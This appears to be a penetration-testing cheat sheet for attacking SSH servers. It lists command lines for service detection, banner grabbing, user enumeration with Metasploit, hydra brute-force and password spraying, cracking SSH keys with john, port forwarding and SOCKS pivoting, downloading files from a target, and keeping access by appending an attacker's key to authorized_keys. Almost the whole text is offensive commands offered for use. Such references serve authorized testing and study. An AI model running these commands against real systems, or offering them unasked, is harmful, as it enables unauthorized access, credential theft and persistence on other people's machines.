# SSH (Secure Shell) — TCP/22

## Detection
```
nmap -p 22 -sV <IP>
nmap -p 22 --script ssh2-enum-algos <IP>
```

## Connect
```
ssh username@X.X.X.X

chmod 600 id_rsa
ssh -i path/to/id_rsa user@target-ip
```

## Banner Grabbing 

### Netcat
```
nc -nv <IP> 22
```

### SSH client (verbose)
```
ssh -vvv user@<IP>
```

## User Enumeration

**NOTE:** SSH user enumeration is implementation/version dependent.

### OpenSSH user enumeration (timing-based)
```
ssh -o PreferredAuthentications=none -o PubkeyAuthentication=no user@<IP>
```

### ssh-user-enum (Metasploit)
```
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <IP>
set USER_FILE users.txt
run
```

## Authentication Testing

### Brute-force
```
hydra -L users.txt -P passwords.txt ssh://<IP>
```

### Password spray
```
hydra -L users.txt -p Winter2024! ssh://<IP>
```

### Patator
```
patator ssh_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

## SSH Key Brute-force
```
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=path/to/wordlist.txt id_rsa.hash
```

## Post-Exploitation

- Forward local ports to the attacker's machine to access network services on the target's network: 

### Local Port Forwarding
```
ssh -L localPort:remoteHost:remotePort user@sshServer
ssh -R remotePort:localHost:localPort user@sshServer
```

### SSH Tunneling
```
ssh -D 8080 user@X.X.X.X
```


## File Transfer

### SCP (Secure Copy Protocol)
#### Download files
```
scp user@target-ip:/path/to/remote/file /path/to/local/destination
```

#### Upload files
```
scp /path/to/local/file user@target-ip:/path/to/remote/destination
```

### SFTP (SSH File Transfer Protocol)
```
sftp user@target-ip
```

## Command Execution
```
ssh user@target-ip 'command_to_run'
```

## Maintaing Access
```
echo your_public_key >> ~/.ssh/authorized_keys
```